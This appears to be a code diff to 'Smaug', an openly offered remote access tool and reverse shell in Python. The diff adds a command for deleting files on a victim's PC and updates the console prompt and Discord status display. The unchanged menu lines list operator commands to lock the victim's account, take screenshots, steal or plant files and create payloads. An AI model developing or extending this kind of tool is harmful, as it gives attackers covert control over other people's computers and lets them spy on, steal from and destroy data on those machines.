@@ -102,6 +102,7 @@ class Utils:
             ['lock       ', 'Lock the victims account!'],
             ['screenshot ', 'Take a screenshot from the victims PC'],
             ['download   ', 'Download files from the victims PC'],
+            ['del        ', 'Delete a directory or a file'],
             ['upload     ', 'Upload files to the victims PC'],
             ['sysinfo    ', 'Shows Information about the victims PC'],
             ['close      ', 'Close the connection and exit the application from both sites']
@@ -193,6 +194,7 @@ class Server:
 
     def run(self):
         while True:
+
             # Handle Command input
             command = input(f"{theme_color}╭── {Fore.WHITE}[ {theme_color}Smaug@{self.address[0]}{Fore.WHITE} ]\n{theme_color}╰──────# {Fore.RESET}")
             command = command.split(" ", 1)
@@ -226,7 +228,7 @@ class Application():
         commands = [
             ['help                     ', 'Show all available commands'],
             ['start server             ', 'Start the rat server'],
-            ['createpayload (<payload>)', 'Create a payload with your settings'],
+            ['createpayload            ', 'Create a payload with your settings'],
             ['clear                    ', 'Clear the console'],
             ['exit                     ', 'Exit the application']
         ]
@@ -292,7 +294,17 @@ def main():
     # Start the application
     application = Application()
     if config.get("discordRPC"):
-        Discord("1083754884114956400", version=f"v{version}")
+        discord = Discord()
+        discord.update(
+            state=f"Version: {version}",
+            large_image="large",
+            large_text="Smaug",
+            small_image="small",
+            small_text="Reverse Shell",
+            buttons=[{"label": "Check It out!", "url": "https://github.com/gokiimax/Smaug-Reverse-Shell"}],
+            start=time.time()
+        )
+
     application.run()
 
 
